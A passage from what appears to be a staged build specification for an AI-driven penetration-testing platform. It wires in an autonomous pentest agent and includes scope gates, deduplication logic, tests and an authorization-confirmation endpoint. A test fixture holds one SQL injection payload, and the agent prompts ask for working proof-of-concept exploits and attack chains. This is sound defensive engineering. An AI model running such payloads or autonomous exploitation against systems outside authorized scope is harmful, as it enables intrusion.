       f"Raw findings: {output.record_count}"

STEP 5: Normalize + Validate findings

  normalizer = StrixResultNormalizer(db)
  
  # Deduplicate Strix findings against what our existing
  # agents already found for this scan
  normalized = await normalizer.normalize_and_deduplicate(
    strix_findings=output.parsed_data,
    scan_id=scan_id,
    db=db
  )
  
  # Run through Phase 6's VulnValidator — same gates for
  # everyone, regardless of which tool generated the finding
  validator = VulnValidator()
  validated_results = await validator.validate_all(normalized)

STEP 6: Store new findings in DB

  finding_processor = FindingProcessor()
  new_finding_count = await finding_processor.process_all(
    scan_id=scan_id,
    validated_results=validated_results,
    db=db,
    tool_override="strix"
  )
  
  # Also store Strix's executive report as a scan note
  run_dir = Path(output.extra.get("run_dir", ""))
    if output.extra else Path("")
  
  report_md = run_dir / "penetration_test_report.md"
  If report_md.exists():
    strix_report_content = report_md.read_text()
    # Store in Scan.ai_summary (append to existing)
    scan.ai_summary = (scan.ai_summary or "") + (
      "\n\n--- STRIX AUTONOMOUS AGENT REPORT ---\n"
      + strix_report_content[:3000]
    )
    await db.commit()

STEP 7: Update scan stats + AuditLog

  Update Scan.total_findings += new_finding_count
  Update Scan.strix_cost_usd = cost_usd (new field, Phase 12)
  
  # Log completion to AuditLog
  await audit_logger.log(
    action="strix_run_completed",
    scan_id=UUID(scan_id),
    organization_id=org.id,
    phase="STRIX",
    severity="INFO",
    metadata={
      "strix_status": strix_status,
      "cost_usd": cost_usd,
      "raw_findings": output.record_count,
      "validated_findings": new_finding_count,
      "run_name": output.extra.get("run_name") if output.extra else None,
      "exit_code": output.extra.get("exit_code") if output.extra else None
    },
    db=db
  )

STEP 8: Fire completion event

  Publish StrixCompleteEvent(
    scan_id=scan_id,
    finding_count=new_finding_count,
    cost_usd=cost_usd,
    status=strix_status
  )
  
  Publish WebSocket update:
    {type: "strix_complete",
     findings: new_finding_count,
     cost_usd: cost_usd,
     status: strix_status}
  
  Set Redis flag:
    agentsec:strix_complete:{scan_id} = "1"
    TTL = 86400

STEP 9: Cleanup

  Remove instruction temp file
  Return {
    "scan_id": scan_id,
    "status": strix_status,
    "cost_usd": cost_usd,
    "new_findings": new_finding_count,
    "raw_findings": output.record_count,
    "execution_time": output.execution_time
  }

─────────────────────────────────────────

Error handling (global try/except around entire task):

  Except any Exception as e:
    Log: f"Strix Agent fatal error for scan {scan_id}: {e}"
    
    Try:
      await audit_logger.log(
        action="strix_run_failed",
        scan_id=UUID(scan_id),
        phase="STRIX",
        severity="CRITICAL",
        metadata={"error": str(e)[:500]},
        db=db
      )
    Except: pass (never let audit logging crash the handler)
    
    # CRITICAL: do NOT mark Scan.status = FAILED here.
    # Strix failure means we don't have Strix findings.
    # The rest of the pipeline still completes normally.
    # The report will note that Strix did not contribute.
    
    Set Redis flag anyway so Orchestrator isn't stuck waiting:
      agentsec:strix_complete:{scan_id} = "1"
    
    Return {"status": "error", "error": str(e)[:200]}

─────────────────────────────────────────

_build_scoped_instruction(target, known_subdomains,
    known_endpoints, known_findings, extra_instruction) → str:

  Always appends the STRICT SCOPE block verbatim at end.
  Never allows caller to override or remove it.
  
  Context section:
    "## Context from AgentSec AI Recon/Enum Phase\n\n"
    "The following assets were already discovered:\n\n"
    
    If known_subdomains:
      "### Known Subdomains (prioritize these):\n"
      Each subdomain on its own line
    
    If known_endpoints:
      "### Interesting Endpoints Discovered:\n"
      Each URL (limit to 30 most interesting)
      Flag: admin panels, login pages, API endpoints
    
    If known_findings:
      "### Preliminary Findings from Rule-Based Scan:\n"
      "Focus on validating and chaining these:\n"
      Summary of top unconfirmed findings (title + severity)
  
  Focus section:
    "## Testing Focus\n"
    extra_instruction if provided
    "\nFocus on: OWASP Top 10 2025 vulnerabilities,\n"
    "business logic flaws, authentication bypass,\n"
    "privilege escalation, and attack chains.\n"
    "Validate and prove each finding with a working PoC.\n"
  
  STRICT SCOPE (always appended, never removable):
    "\n\n## STRICT SCOPE CONSTRAINTS\n"
    f"- ONLY test: {target} and its subdomains listed above\n"
    "- Do NOT pivot to any other hostname or IP\n"
    "- Do NOT delete, modify, or exfiltrate real data\n"
    "- Do NOT interact with payment or checkout flows\n"
    "- Do NOT create accounts or sign up for services\n"
    "- Stop and report if you detect you are outside scope\n"

─────────────────────────────────────────

_load_known_subdomains(scan_id, db, limit) → async → list[str]:
  Query Subdomain where scan_id == scan_id
         AND is_alive == True
  Order by http_status ASC (200s first)
  Limit limit
  Return [s.name for s in results]

_load_interesting_endpoints(scan_id, db, limit) → async → list[str]:
  Query Endpoint where scan_id == scan_id
         AND (is_admin OR is_login OR is_api OR has_parameters)
  Limit limit
  Return [e.url for e in results]

_load_existing_findings_summary(scan_id, db) → async → list[dict]:
  Query Finding where scan_id == scan_id
         AND severity in (CRITICAL, HIGH)
         AND is_confirmed == False
         AND is_false_positive == False
  Return [{title, severity, affected_url} for f in results[:10]]

Generate strix_agent.py only. Stop after.
```

---

### Step 11.6 — Decision Engine Extension

```
PHASE 11 — STEP 6

Generate: str_replace addition to
backend/orchestrator/decision_engine.py

Add this method to the existing DecisionEngine class:

─────────────────────────────────────────

decide_strix_invocation(
  context: ScanContext,
  vuln_findings_so_far: list[dict],
  scan_mode: str = "CLASSIC"
) → ToolDecision | None:

  """
  Decides whether to invoke Strix and with what parameters.
  Returns None if Strix should not run.
  Never invoked in CLASSIC mode regardless of other conditions.
  """
  
  # NEVER invoke in classic mode
  if scan_mode == "CLASSIC":
    return None
  
  if not settings.strix.enabled:
    return None
  
  # AUTONOMOUS mode — Strix is the primary tester
  if scan_mode == "AUTONOMOUS":
    return ToolDecision(
      tool_name="strix_plugin",
      queue="strix_queue",
      priority=4,
      reason=(
        "AUTONOMOUS scan mode: Strix is the primary tester. "
        "Classic Vuln/Secrets agents are skipped. "
        "Strix will run deep AI-driven validation "
        f"with budget ${settings.strix.max_budget_usd}."
      ),
      input_params={
        "strix_scan_mode": "deep",
        "strix_instruction": (
          "Deep autonomous penetration test. "
          "Explore all attack vectors thoroughly. "
          "Chain findings where possible."
        )
      },
      fallback_tool=None
    )
  
  # HYBRID mode — Strix supplements classic tools
  # Only invoke on specific signals

  # Signal 1: Complex GraphQL surface
  if context.has_graphql:
    return ToolDecision(
      tool_name="strix_plugin",
      queue="strix_queue",
      priority=5,
      reason=(
        "GraphQL endpoint detected. Strix specializes in "
        "GraphQL introspection abuse, batching attacks, "
        "and field-level authorization bypass — rule-based "
        "tools provide limited coverage here."
      ),
      input_params={
        "strix_scan_mode": "standard",
        "strix_instruction": (
          "Focus on GraphQL security: introspection, "
          "batching, field-level IDOR, and auth bypass "
          "via query manipulation."
        )
      },
      fallback_tool=None
    )
  
  # Signal 2: Multiple unconfirmed HIGH/CRITICAL findings
  # (rule-based found signal but couldn't confirm exploitability)
  unconfirmed_critical = [
    f for f in vuln_findings_so_far
    if f.get("severity") in ("HIGH", "CRITICAL")
    and not f.get("is_confirmed")
    and not f.get("is_false_positive")
  ]
  
  if len(unconfirmed_critical) >= 3:
    titles = [f.get("title", "")[:40] for f in unconfirmed_critical[:3]]
    return ToolDecision(
      tool_name="strix_plugin",
      queue="strix_queue",
      priority=5,
      reason=(
        f"{len(unconfirmed_critical)} unconfirmed "
        f"HIGH/CRITICAL findings need AI-driven validation. "
        f"Rule-based tools found signal but could not prove "
        f"exploitability. Strix will attempt to confirm and "
        f"generate PoCs. Top unconfirmed: "
        + ", ".join(titles)
      ),
      input_params={
        "strix_scan_mode": "standard",
        "strix_instruction": (
          "Focus on validating and chaining the following "
          "preliminary findings into confirmed exploits "
          "with working proof-of-concept scripts."
        )
      },
      fallback_tool=None
    )
  
  # Signal 3: Complex auth surface (login + API + no confirmed findings)
  confirmed_count = len([f for f in vuln_findings_so_far
                         if f.get("is_confirmed")])
  if (context.has_api_endpoints and
      context.has_login_page and
      confirmed_count == 0 and
      context.endpoint_count > 20):
    return ToolDecision(
      tool_name="strix_plugin",
      queue="strix_queue",
      priority=6,
      reason=(
        "Complex authenticated API surface with login page "
        f"and {context.endpoint_count} endpoints but zero "
        "confirmed findings from rule-based scan. "
        "Strix will test business logic, IDOR, and "
        "auth bypass which rule-based tools miss."
      ),
      input_params={
        "strix_scan_mode": "standard",
        "strix_instruction": (
          "Focus on: IDOR across API endpoints, "
          "authentication bypass, privilege escalation, "
          "business logic flaws, and rate limiting bypass."
        )
      },
      fallback_tool=None
    )
  
  # No signal strong enough for Strix in HYBRID mode
  return None

─────────────────────────────────────────

Also add to ScanContext dataclass (str_replace in
backend/workers/processors/context_builder.py):

  strix_scan_mode: str = "standard"
  strix_requested: bool = False

And to the build() method:
  strix_requested = context_dict.get("strix_requested", False)
  strix_scan_mode = context_dict.get(
    "strix_scan_mode", settings.strix.default_scan_mode
  )

Generate additions only. Stop after.
```

---

### Step 11.7 — Strix Output Normalizer + Deduplicator

```
PHASE 11 — STEP 7

Generate: backend/workers/processors/strix_normalizer.py

StrixResultNormalizer class:

normalize_and_deduplicate(
  strix_findings: list[dict],
  scan_id: str,
  db: AsyncSession
) → async → list[dict]:

  # Step 1: normalize format
  normalized = [_normalize_finding(f) for f in strix_findings
                if isinstance(f, dict)]
  
  # Step 2: deduplicate against existing findings in DB
  existing = await _load_existing_findings(scan_id, db)
  
  result = []
  for finding in normalized:
    dupe = _find_duplicate(finding, existing)
    
    If dupe is not None:
      # Corroborate existing finding instead of duplicating
      await _corroborate_existing(finding, dupe, db)
      Log: f"Strix corroborated: {finding['title'][:50]}"
    Else:
      result.append(finding)
      Log: f"Strix new finding: {finding['title'][:50]}"
  
  Log: (f"Strix normalization: {len(strix_findings)} raw → "
        f"{len(result)} new + "
        f"{len(normalized) - len(result)} corroborations")
  
  Return result

─────────────────────────────────────────

_normalize_finding(f: dict) → dict:

  # Map Strix severity strings to our Severity enum values
  SEVERITY_MAP = {
    "critical": "CRITICAL",
    "high": "HIGH",
    "medium": "MEDIUM",
    "low": "LOW",
    "info": "INFO",
    "informational": "INFO",
    "none": "INFO"
  }
  raw_sev = f.get("severity", "medium")
  severity = SEVERITY_MAP.get(raw_sev.lower(), "MEDIUM")
  
  # Build rich evidence from all Strix fields
  # Strix provides MUCH richer evidence than rule-based tools
  evidence_parts = []
  
  If f.get("evidence"):
    evidence_parts.append(f"## Evidence\n{f['evidence']}")
  
  If f.get("poc_description"):
    evidence_parts.append(f"## PoC Description\n{f['poc_description']}")
  
  If f.get("poc_script"):
    evidence_parts.append(
      f"## PoC Script\n```python\n{f['poc_script']}\n```"
    )
  
  If f.get("technical_analysis"):
    evidence_parts.append(
      f"## Technical Analysis\n{f['technical_analysis']}"
    )
  
  If f.get("assumptions"):
    evidence_parts.append(
      f"## Assumptions\n{f['assumptions']}"
    )
  
  If f.get("cvss_breakdown"):
    breakdown = f["cvss_breakdown"]
    evidence_parts.append(
      f"## CVSS Breakdown\n"
      + "\n".join(f"- {k}: {v}" for k, v in breakdown.items())
    )
  
  # Strix remediation_steps is free text (not a list like our tools)
  remediation = f.get("remediation_steps", "")
  
  # Impact text → business_impact field
  business_impact = f.get("impact", "")
  
  return {
    "title": f.get("title", "Unknown Vulnerability"),
    "severity": severity,
    "description": f.get("description", ""),
    "affected_url": (
      f.get("affected_url") or
      f.get("endpoint") or
      f.get("target")
    ),
    "affected_parameter": f.get("affected_parameter") or f.get("method"),
    "evidence": "\n\n".join(evidence_parts),
    "business_impact": business_impact,
    "remediation": remediation,
    "cvss_score": float(f.get("cvss_score") or 0) or None,
    "cve_id": f.get("cve_id"),
    "cwe_id": f.get("cwe_id"),
    "tool_found_by": "strix",
    
    # Strix findings are AI-validated with real PoCs
    # — treat as pre-confirmed but still run VulnValidator
    "is_confirmed": bool(
      f.get("poc_script") or f.get("poc_description")
    ),
    
    # Store strix-specific metadata for reference
    "strix_id": f.get("strix_id"),
    "strix_agent": f.get("strix_agent"),
    "finding_class": f.get("finding_class", "dynamic"),
    "fix_effort": f.get("fix_effort"),
    
    # Pass through for VulnValidator
    "request": None,
    "response": None
  }

─────────────────────────────────────────

_find_duplicate(new_finding: dict,
                existing: list[Finding]) → Finding | None:

  Lightweight heuristic — no embeddings needed.
  Uses title token overlap + URL match.
  
  new_title_tokens = set(
    new_finding["title"].lower()
    .replace("-", " ").replace("_", " ")
    .split()
  )
  new_url = (new_finding.get("affected_url") or "").lower()
  
  For each existing_finding in existing:
    existing_title_tokens = set(
      existing_finding.title.lower()
      .replace("-", " ").replace("_", " ")
      .split()
    )
    existing_url = (existing_finding.affected_url or "").lower()
    
    # URL match check (if both have URLs)
    urls_match = (
      new_url and existing_url and
      (new_url in existing_url or existing_url in new_url or
       _url_path_similarity(new_url, existing_url) > 0.8)
    )
    
    # Title token overlap check
    if new_title_tokens and existing_title_tokens:
      overlap = len(new_title_tokens & existing_title_tokens)
      union = len(new_title_tokens | existing_title_tokens)
      title_similarity = overlap / union if union else 0
    else:
      title_similarity = 0
    
    # Consider it a duplicate if:
    # - Title similarity >= 60% AND URL match
    # - OR title similarity >= 80% (strong title match alone)
    if (title_similarity >= 0.6 and urls_match) or \
       title_similarity >= 0.8:
      return existing_finding
  
  Return None

─────────────────────────────────────────

_corroborate_existing(
  strix_finding: dict,
  existing: Finding,
  db: AsyncSession
) → async → None:

  # Append Strix corroboration to existing finding evidence
  corroboration = (
    "\n\n" + "─" * 60 + "\n"
    "🤖 CORROBORATED BY STRIX AUTONOMOUS AGENT\n"
    + "─" * 60 + "\n"
  )
  
  If strix_finding.get("evidence"):
    corroboration += f"\nStrix Evidence:\n{strix_finding['evidence'][:1000]}\n"
  
  If strix_finding.get("poc_script"):
    corroboration += (
      f"\nStrix PoC Script:\n"
      f"```python\n{strix_finding['poc_script'][:500]}\n```\n"
    )
  
  # Update existing finding
  existing.evidence = (existing.evidence or "") + corroboration
  existing.is_confirmed = True  # Strix corroboration = confirmed
  
  # Strix often produces higher confidence CVSS
  If strix_finding.get("cvss_score") and (
    not existing.cvss_score or
    strix_finding["cvss_score"] > existing.cvss_score
  ):
    existing.cvss_score = strix_finding["cvss_score"]
  
  await db.commit()

─────────────────────────────────────────

_url_path_similarity(url1: str, url2: str) → float:

  Extract paths from URLs and compute similarity.
  "/api/users/1" vs "/api/users/2" → ~0.9
  "/login" vs "/dashboard" → 0.0
  
  from urllib.parse import urlparse
  path1 = urlparse(url1).path.strip("/")
  path2 = urlparse(url2).path.strip("/")
  
  If not path1 or not path2: return 0.0
  
  parts1 = set(path1.split("/"))
  parts2 = set(path2.split("/"))
  
  overlap = len(parts1 & parts2)
  union = len(parts1 | parts2)
  return overlap / union if union else 0.0

_load_existing_findings(scan_id: str,
                        db: AsyncSession) → async → list[Finding]:
  Query all Finding where scan_id == scan_id
         AND is_false_positive == False
  Return results

Generate strix_normalizer.py only. Stop after.
```

---

### Step 11.8 — Phase 11 Verification

```
PHASE 11 — STEP 8 — FINAL VERIFICATION

Write: tests/test_strix_agent.py

All tests use @pytest.mark.unit unless noted.

─────────────────────────────────────────

class TestStrixPlugin:

test_build_command_always_includes_safety_flags():
  plugin = registry.get("strix_plugin")
  input = PluginInput(scan_id="test", target="example.com",
                      extra_params={}, timeout=60)
  cmd = plugin.build_command(input)
  Assert: "--non-interactive" in cmd
  Assert: "--max-budget" in cmd
  Assert: "--max-turns" in cmd
  Assert: "--run-name" in cmd

test_build_command_never_allows_missing_flags():
  # Even with empty extra_params, safety flags must appear
  cmd = plugin.build_command(PluginInput(
    scan_id="x", target="y.com", extra_params={}, timeout=10
  ))
  Assert: "--non-interactive" in cmd
  Assert: "--max-budget" in cmd

test_parse_output_valid_vulnerabilities_json():
  raw = """[vulnerabilities.json]
  [
    {
      "id": "vuln-0001",
      "title": "SQL Injection in login endpoint",
      "severity": "high",
      "description": "The login form is vulnerable to SQLi",
      "endpoint": "https://example.com/login",
      "evidence": "1' OR '1'='1 returned 200",
      "poc_description": "Submit payload in username field",
      "remediation_steps": "Use parameterized queries",
      "cvss": 8.2,
      "cwe": "CWE-89"
    }
  ]
  """
  results = plugin.parse_output(raw)
  Assert: len(results) == 1
  Assert: results[0]["title"] == "SQL Injection in login endpoint"
  Assert: results[0]["severity"] == "HIGH"
  Assert: results[0]["cwe_id"] == "CWE-89"
  Assert: results[0]["cvss_score"] == 8.2
  Assert: "Evidence" in results[0]["evidence"]
  Assert: "PoC" in results[0]["evidence"]

test_parse_output_handles_malformed_json():
  raw = "[vulnerabilities.json]\n{{{not valid"
  results = plugin.parse_output(raw)
  Assert: results == []
  (No exception raised)

test_parse_output_handles_missing_section():
  raw = "Strix output without the marker"
  results = plugin.parse_output(raw)
  Assert: results == []

test_parse_output_maps_severity_correctly():
  raw = """[vulnerabilities.json]
  [
    {"id": "v1", "title": "T1", "severity": "critical"},
    {"id": "v2", "title": "T2", "severity": "high"},
    {"id": "v3", "title": "T3", "severity": "informational"}
  ]
  """
  results = plugin.parse_output(raw)
  Assert: results[0]["severity"] == "CRITICAL"
  Assert: results[1]["severity"] == "HIGH"
  Assert: results[2]["severity"] == "INFO"

test_health_check_fails_when_docker_down(monkeypatch):
  Mock subprocess docker info to return code 1
  Assert: health_check() returns False

test_health_check_fails_when_strix_missing(monkeypatch):
  Mock shutil.which("strix") to return None
  Assert: health_check() returns False

─────────────────────────────────────────

class TestStrixAgentSafetyGates:

test_gate1_disabled_by_default(db_session):
  settings.strix.enabled = False
  result = await _async_start_strix(mock_self,
    "scan-id", {})
  Assert: result["status"] == "disabled"
  Assert: executor.run NOT called (mock)

test_gate2_blocked_without_org_consent(db_session):
  settings.strix.enabled = True
  org.authorized_scope_confirmed = False
  result = await _async_start_strix(mock_self,
    scan.id, {})
  Assert: result["status"] == "blocked_unauthorized"
  Assert: executor.run NOT called

test_gate3_blocked_on_invalid_target(db_session):
  settings.strix.enabled = True
  org.authorized_scope_confirmed = True
  scan.target = "192.168.1.1"  # private IP
  result = await _async_start_strix(mock_self,
    scan.id, {})
  Assert: result["status"] == "blocked_scope"

test_gate4_blocked_when_strix_unhealthy(db_session,
  monkeypatch):
  settings.strix.enabled = True
  org.authorized_scope_confirmed = True
  Mock health_checker to return is_healthy=False
  result = await _async_start_strix(mock_self, scan.id, {})
  Assert: result["status"] == "blocked_unhealthy"

─────────────────────────────────────────

class TestDecisionEngine:

test_strix_never_invoked_in_classic_mode():
  decision = engine.decide_strix_invocation(
    context=make_context(has_graphql=True),
    vuln_findings=[],
    scan_mode="CLASSIC"
  )
  Assert: decision is None

test_strix_invoked_in_autonomous_mode():
  decision = engine.decide_strix_invocation(
    context=make_context(),
    vuln_findings=[],
    scan_mode="AUTONOMOUS"
  )
  Assert: decision is not None
  Assert: decision.tool_name == "strix_plugin"
  Assert: decision.input_params["strix_scan_mode"] == "deep"

test_strix_invoked_for_graphql_in_hybrid():
  decision = engine.decide_strix_invocation(
    context=make_context(has_graphql=True),
    vuln_findings=[],
    scan_mode="HYBRID"
  )
  Assert: decision is not None
  Assert: "GraphQL" in decision.reason

test_strix_invoked_for_unconfirmed_findings_in_hybrid():
  findings = [
    {"severity": "HIGH", "is_confirmed": False,
     "is_false_positive": False, "title": f"Finding {i}"}
    for i in range(5)
  ]
  decision = engine.decide_strix_invocation(
    context=make_context(has_graphql=False),
    vuln_findings=findings,
    scan_mode="HYBRID"
  )
  Assert: decision is not None
  Assert: "unconfirmed" in decision.reason.lower()

test_strix_not_invoked_in_hybrid_no_signals():
  decision = engine.decide_strix_invocation(
    context=make_context(has_graphql=False,
                         has_api_endpoints=False),
    vuln_findings=[],
    scan_mode="HYBRID"
  )
  Assert: decision is None

─────────────────────────────────────────

class TestStrixNormalizer:

test_normalize_maps_severity():
  finding = {"title": "XSS", "severity": "high",
             "endpoint": "/search"}
  result = _normalize_finding(finding)
  Assert: result["severity"] == "HIGH"
  Assert: result["tool_found_by"] == "strix"

test_normalize_builds_evidence_from_all_fields():
  finding = {
    "title": "SQLi",
    "severity": "critical",
    "evidence": "Raw evidence here",
    "poc_description": "Submit payload",
    "poc_script_code": "import requests\n...",
    "technical_analysis": "The endpoint is vulnerable"
  }
  result = _normalize_finding(finding)
  Assert: "Evidence" in result["evidence"]
  Assert: "PoC Description" in result["evidence"]
  Assert: "PoC Script" in result["evidence"]
  Assert: "Technical Analysis" in result["evidence"]

test_normalize_confirmed_when_poc_exists():
  finding = {"title": "X", "severity": "high",
             "poc_script_code": "exploit code"}
  result = _normalize_finding(finding)
  Assert: result["is_confirmed"] == True

test_normalize_not_confirmed_without_poc():
  finding = {"title": "X", "severity": "low"}
  result = _normalize_finding(finding)
  Assert: result["is_confirmed"] == False

test_deduplication_corroborates_existing(db_session):
  existing_finding = FindingFactory(
    title="SQL Injection in login",
    affected_url="https://example.com/login",
    is_confirmed=False
  )
  db_session.add(existing_finding)
  await db_session.commit()
  
  strix_finding = {
    "title": "SQL Injection in login endpoint",
    "severity": "HIGH",
    "affected_url": "https://example.com/login",
    "evidence": "Confirmed by Strix",
    "poc_script": "exploit.py code"
  }
  
  normalizer = StrixResultNormalizer(db_session)
  new_findings = await normalizer.normalize_and_deduplicate(
    [strix_finding], "scan-id", db_session
  )
  
  Assert: len(new_findings) == 0
    (no new finding — it's a duplicate)
  
  await db_session.refresh(existing_finding)
  Assert: existing_finding.is_confirmed == True
  Assert: "CORROBORATED BY STRIX" in existing_finding.evidence

test_url_path_similarity():
  Assert: _url_path_similarity(
    "https://example.com/api/users/1",
    "https://example.com/api/users/2"
  ) > 0.8
  
  Assert: _url_path_similarity(
    "https://example.com/login",
    "https://example.com/dashboard"
  ) < 0.3

─────────────────────────────────────────

class TestAuditLog:

test_audit_logger_creates_record(db_session):
  await audit_logger.log(
    action="strix_run_started",
    scan_id=UUID("..."),
    metadata={"target": "example.com"},
    db=db_session
  )
  record = (await db_session.execute(
    select(AuditLog).where(AuditLog.action == "strix_run_started")
  )).scalar_one()
  
  Assert: record is not None
  Assert: record.action == "strix_run_started"
  Assert: record.metadata["target"] == "example.com"

test_audit_log_never_blocks_scan(db_session, monkeypatch):
  # Even if audit logging fails, scan continues
  monkeypatch.setattr(db_session, "commit",
    side_effect=Exception("DB error"))
  
  # Should not raise
  result = await _async_start_strix(mock_self,
    "scan-id", {})
  Assert: "error" not in result or result is not None

─────────────────────────────────────────

Run: pytest tests/test_strix_agent.py -v
All tests must pass. Phase 11 complete when all pass.

─────────────────────────────────────────

Integration test (manual, NEVER in CI):

STEP 1: Start DVWA
  docker run -d -p 8080:80 vulnerables/web-dvwa

STEP 2: Set small budget in .env
  STRIX_AGENT_ENABLED=True
  STRIX_MAX_BUDGET_USD=2.00
  STRIX_MAX_TURNS=50
  STRIX_DEFAULT_SCAN_MODE=quick
  STRIX_LLM=anthropic/claude-sonnet-4-6

STEP 3: Confirm org scope via API
  POST /api/v1/organizations/{id}/confirm-authorized-scope
  {
    "confirmation_statement":
      "I confirm I am authorized to conduct penetration
       testing against the targets I submit to this platform.",
    "signed_by": "Test Admin"
  }

STEP 4: Create scan against DVWA
  POST /api/v1/scans
  {
    "target": "http://localhost:8080",
    "scan_type": "FULL",
    "scan_mode": "HYBRID",
    "config": {"strix_scan_mode": "quick"}
  }

STEP 5: Monitor via WebSocket + AuditLog
  GET /api/v1/scans/{id}/logs

STEP 6: Verify findings
  GET /api/v1/findings/scans/{id}/findings
  Assert: at least some findings have tool_found_by="strix"
  Assert: some findings have is_confirmed=True
  Assert: AuditLog has strix_run_started + strix_run_completed

STEP 7: Verify cost tracked
  GET /api/v1/scans/{id}
  Assert: strix_cost_usd is populated

STEP 8: Check strix_runs/ directory
  docker compose exec strix_worker \
    ls /app/strix_runs/agentsec-{id}/
  Should show: run.json, vulnerabilities.json,
               penetration_test_report.md
```

---
---

# PHASE 12 — UNIFIED SCAN MODES & REPORT MERGE

---

### Step 12.0 — Phase 12 Master Context

```
PHASE 12 — UNIFIED SCAN MODES & REPORT MERGE

Phase 11 complete. Strix integrated as gated plugin.
Now building user-facing scan mode selection and
merging Strix output into the existing PDF report.

Three scan modes (defined precisely):

CLASSIC (default):
  Exactly what Phases 0-10 built.
  Strix never invoked. No behavior change.
  Fast, deterministic, cheapest.

HYBRID:
  Classic pipeline runs fully (Recon → Enum → Vuln
  → Secrets → Report). After Vuln Agent completes,
  Decision Engine's decide_strix_invocation() checks
  whether signals warrant a Strix pass. If yes, Strix
  runs and its findings merge into the same DB/report.
  Default for users who want "AI validation."

AUTONOMOUS:
  Recon + Enum agents still run (fast, cheap, give
  Strix a head start with subdomain/endpoint list).
  Classic Vuln + Secrets agents are SKIPPED.
  Strix runs as primary tester with scan_mode="deep"
  and larger budget. Report marks all findings as
  AI-validated.

New requirements:
  1. ScanMode enum in Scan model
  2. Organization.authorized_scope_confirmed field
  3. API endpoint to confirm org scope (with legal statement)
  4. Orchestrator fork at on_enum_complete() per mode
  5. Report HTML shows AI-Validated badge on Strix findings
  6. Report shows scan mode in statistics section
  7. CI/CD endpoint for repo scanning (separate code path)
  8. Frontend: scan creation modal shows mode selector
  9. Frontend: Live Progress shows mode + Strix status
  10. Frontend: Vulnerability dashboard badges Strix findings

Token rule:
Generate in order, wait for "next" between each:
  Step 12.1: Model + Schema additions
  Step 12.2: Org scope confirmation endpoint
  Step 12.3: Orchestrator mode branching
  Step 12.4: Scan API scan_mode validation
  Step 12.5: Strix event handlers in Orchestrator
  Step 12.6: Report merge (PDF + AI badge)
  Step 12.7: CI/CD endpoint
  Step 12.8: Frontend additions
  Step 12.9: Verification
```

---

### Step 12.1 — Model + Schema Additions

```
PHASE 12 — STEP 1

Generate str_replace additions to:
  backend/models/scan.py
  backend/models/organization.py
  backend/api/schemas.py

─────────────────────────────────────────

models/scan.py additions:

Add to ScanType Enum (already exists):
  DEEP_AI = "DEEP_AI"  # full autonomous mode

Add new Enum:
class ScanMode(str, Enum):
  CLASSIC = "CLASSIC"
  HYBRID = "HYBRID"
  AUTONOMOUS = "AUTONOMOUS"

Add to Scan model fields:
  scan_mode: Mapped[str] = mapped_column(
    SQLAlchemyEnum(ScanMode),
    default=ScanMode.CLASSIC,
    nullable=False
  )
  strix_cost_usd: Mapped[Optional[float]] = mapped_column(
    Float, nullable=True, default=None
  )
  strix_run_name: Mapped[Optional[str]] = mapped_column(
    String(200), nullable=True
  )
  strix_status: Mapped[Optional[str]] = mapped_column(
    String(50), nullable=True
  )

─────────────────────────────────────────

models/organization.py additions:

Add to Organization model:
  authorized_scope_confirmed: Mapped[bool] = mapped_column(
    Boolean, default=False, nullable=False
  )
  scope_confirmed_at: Mapped[Optional[datetime]] = mapped_column(
    DateTime(timezone=True), nullable=True
  )
  scope_confirmed_by: Mapped[Optional[str]] = mapped_column(
    String(255), nullable=True
  )
  scope_confirmation_hash: Mapped[Optional[str]] = mapped_column(
    String(64), nullable=True
    # SHA256 of the confirmation statement — audit trail
  )

─────────────────────────────────────────

schemas.py additions:

class ScanMode(str, Enum):
  CLASSIC = "classic"
  HYBRID = "hybrid"
  AUTONOMOUS = "autonomous"

Update CreateScanRequest:
  scan_mode: ScanMode = ScanMode.CLASSIC
  strix_instruction: str | None = None
    # Optional custom instruction for Strix
    # Max 1000 chars to prevent prompt injection
    @field_validator("strix_instruction")
    def validate_instruction_length(cls, v):
      if v and len(v) > 1000:
        raise ValueError("strix_instruction max 1000 chars")
      return v

Update ScanResponse to include:
  scan_mode: str
  strix_cost_usd: float | None
  strix_status: str | None

New schema:
class ConfirmScopeRequest(BaseModel):
  confirmation_statement: str
  signed_by: str = Field(min_length=2, max_length=200)

REQUIRED_SCOPE_STATEMENT = (
  "I confirm I am authorized to conduct penetration "
  "testing against the targets I submit to this platform."
)

class ScopeConfirmationResponse(BaseModel):
  confirmed: bool
  confirmed_at: datetime
  signed_by: str
  message: str

Generate additions only. Stop after.
```

---

### Step 12.2 — Org Scope Confirmation Endpoint

```
PHASE 12 — STEP 2

Generate: backend/api/organization.py

router = APIRouter()

POST /organizations/{org_id}/confirm-authorized-scope:
  
  Requires: JWT auth, user must be admin of this org
  Request: ConfirmScopeRequest
  Response: ScopeConfirmationResponse
  
  Logic:
    STEP 1: Verify user owns/administers this org
      Load org from DB
      If org not found: 404
      If current_user.role != "ADMIN" and
         org.id not in user.organizations: 403
    
    STEP 2: Verify exact statement match
      from backend.api.schemas import REQUIRED_SCOPE_STATEMENT
      If request.confirmation_statement.strip() != REQUIRED_SCOPE_STATEMENT:
        Return 400 {
          "code": "STATEMENT_MISMATCH",
          "message": "Confirmation statement does not match required text",
          "required": REQUIRED_SCOPE_STATEMENT
        }
    
    STEP 3: Hash the statement for audit trail
      import hashlib
      statement_hash = hashlib.sha256(
        request.confirmation_statement.encode()
      ).hexdigest()
    
    STEP 4: Update organization
      org.authorized_scope_confirmed = True
      org.scope_confirmed_at = datetime.utcnow()
      org.scope_confirmed_by = request.signed_by
      org.scope_confirmation_hash = statement_hash
      await db.commit()
    
    STEP 5: Create AuditLog entry
      await audit_logger.log(
        action="org_scope_confirmed",
        organization_id=org.id,
        user_id=current_user.id,
        severity="WARNING",
        metadata={
          "signed_by": request.signed_by,
          "confirmed_at": org.scope_confirmed_at.isoformat(),
          "statement_hash": statement_hash,
          "ip_address": request.client.host
        },
        db=db
      )
    
    Return ScopeConfirmationResponse(
      confirmed=True,
      confirmed_at=org.scope_confirmed_at,
      signed_by=request.signed_by,
      message=(
        "Authorized scope confirmed. "
        "HYBRID and AUTONOMOUS scan modes are now available. "
        "All AI-agent scans are logged in the audit trail. "
        "You are legally responsible for having authorization "
        "for all targets you submit."
      )
    )

GET /organizations/{org_id}/scope-status:
  Returns current scope confirmation status:
  {
    confirmed: bool,
    confirmed_at: datetime | null,
    signed_by: str | null,
    can_use_hybrid: bool (confirmed AND strix enabled),
    can_use_autonomous: bool (same as above)
  }

Add this router to app_factory.py:
  app.include_router(
    organization_router,
    prefix="/api/v1/organizations",
    tags=["Organizations"],
